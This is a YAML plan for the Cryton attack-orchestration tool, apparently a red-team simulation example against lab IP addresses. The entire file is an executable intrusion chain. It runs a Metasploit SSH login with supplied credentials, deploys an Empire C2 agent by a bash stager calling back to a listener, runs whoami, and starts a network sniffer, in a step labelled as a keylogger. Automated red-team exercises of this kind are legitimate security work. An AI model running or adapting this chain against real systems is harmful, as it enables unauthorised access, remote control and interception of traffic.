plan:
  name: Simulation example
  owner: test name
  stages:
  - name: stage-one
    trigger_type: delta
    trigger_args:
      seconds: 5
    steps:
    - name: ssh-session
      step_type: cryton/execute-on-worker
      arguments:
        create_named_session: session_to_target_1
        attack_module: mod_msf
        attack_module_args:
          exploit: auxiliary/scanner/ssh/ssh_login
          exploit_arguments:
            RHOSTS: 192.168.33.11
            USERNAME: $parent.username
            PASSWORD: $parent.password
      next:
        - type: result
          value: OK
          step: deploy-agent
    - name: deploy-agent
      step_type: empire/deploy-agent
      arguments:
        use_named_session: session_to_target_1 # using named session created in step ssh-session
        stager_arguments:
          os_type: linux
          listener_name: testing
          listener_port: 80
          stager_type: multi/bash
          agent_name: MyAgent # only lower/upper characters and number allowed in name
      next:
        - type: result
          value: OK
          step: whoami-on-agent
    - name: whoami-on-agent
      step_type: empire/execute-on-agent
      arguments:
        use_agent: MyAgent
        shell_command: whoami
      next:
        - type: result
          value: OK
          step: keylogger-on-agent
    - name: keylogger-on-agent
      step_type: empire/execute-on-agent
      arguments:
        use_agent: MyAgent
        empire_module: collection/sniffer
        empire_module_args: # Optional
          IpFilter: 192.168.33.12
          PortFilter: 1234